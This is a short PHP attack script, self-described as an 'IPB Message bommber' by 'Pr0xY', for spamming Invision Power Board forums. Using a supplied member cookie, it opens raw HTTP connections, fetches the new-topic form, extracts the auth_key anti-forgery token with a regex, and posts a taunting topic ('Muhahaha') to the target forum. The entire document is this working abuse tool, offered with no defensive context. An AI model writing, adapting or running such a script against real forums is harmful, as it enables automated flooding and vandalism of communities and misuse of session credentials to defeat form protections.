<?php
 
 #IPB Message bommber :) V1.1
 #Powered by Pr0xY
 
 $target   = "";
 $path     = "";
 
 $user_id  = '';
 $password = '';
 $forum_id = '';
 
 $tile = "IPB Message bommber :)";
 $desc = "Muhahaha";
 $post = "Powered by Pr0xY";
 
 $cookie = "member_id={$user_id}; pass_hash={$password};";
 $contents = '';
 $sock = fsockopen($target, '80');
 $pack = "GET {$path}/index.php?act=Post&CODE=00&f={$forum_id} HTTP/1.1\r\n";
 $pack.= "Host: {$target}\r\n";
 $pack.= "Cookie: " .$cookie. "\r\n";
 $pack.= "Connection: keep-alive\r\n\r\n";
 
 fwrite($sock, $pack);
 while(!feof($sock)) $contents.= fgets($sock, 4096);
 
 if(preg_match("/(name\=\'auth_key\'\s+value\=\')([a-z0-9]{32})(\')/", $contents, $timeHash))
 {
    $th = $timeHash[2];
    $data = "st=0&act=Post&s=&f=4&auth_key=".$th."&CODE=01&TopicTitle={$tile}&TopicDesc={$desc}&Post={$post}";
   $contents = '';
   
   $sock = fsockopen($target, '80');
   $pack = "POST {$path}/index.php?act=Post&CODE=00&f={$forum_id} HTTP/1.1\r\n";
   $pack.= "Host: {$target}\r\n";
   $pack.= "Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\n";
   $pack.= "Cookie: " .$cookie. "\r\n";
   $pack.= "Keep-Alive: 300\r\n";
   $pack.= "Connection: keep-alive\r\n";
   $pack.= "Referer: http://{$target}/index.php?act=Post&CODE=00&f={$forum_id}\r\n";
   $pack.= "Content-Type: application/x-www-form-urlencoded\r\n";
   $pack.= "Content-Length: " .strlen($data). "\r\n\r\n";
   $pack.= $data;   
   
   fwrite($sock, $pack);
   fclose($sock);
 } 
 
 
?>
